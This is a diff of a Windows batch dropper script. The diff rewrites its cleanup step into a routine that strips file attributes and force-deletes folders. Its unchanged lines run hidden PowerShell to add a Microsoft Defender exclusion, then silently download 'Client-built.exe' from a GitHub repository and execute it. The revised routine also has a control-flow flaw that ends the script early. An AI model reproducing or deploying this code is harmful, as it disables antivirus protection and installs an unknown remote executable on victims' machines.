@@ -7,13 +7,23 @@ set "TRACES_DIR=%APPDATA_PATH%\Roaming\Traces"
 set "TARGET_FILE=%TRACES_DIR%\Client-built.exe"
 set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/main/Client-built.exe"
 
-:: Delete SubDir and Traces contents
-if exist "%SUBDIR%" (
-    rmdir /s /q "%SUBDIR%"
+:: Fully clean folder function (hidden, system, read-only files too)
+:clean_folder
+if exist "%~1" (
+    attrib -h -r -s "%~1\*" /S /D >nul 2>&1
+    del /f /s /q "%~1\*" >nul 2>&1
+    for /d %%D in ("%~1\*") do (
+        call :clean_folder "%%D"
+    )
+    rmdir /s /q "%~1" >nul 2>&1
 )
-if exist "%TRACES_DIR%" (
-    rmdir /s /q "%TRACES_DIR%"
-)
+exit /b
+
+:: Delete everything in SubDir and Traces
+call :clean_folder "%SUBDIR%"
+call :clean_folder "%TRACES_DIR%"
+
+:: Recreate empty folders
 mkdir "%SUBDIR%"
 mkdir "%TRACES_DIR%"
 
@@ -40,7 +50,9 @@ powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDA
 :: Download and run client
 powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"
 start "" "%TARGET_FILE%"
+
 exit
+
 
 :: By MrAboudi
 :: v3
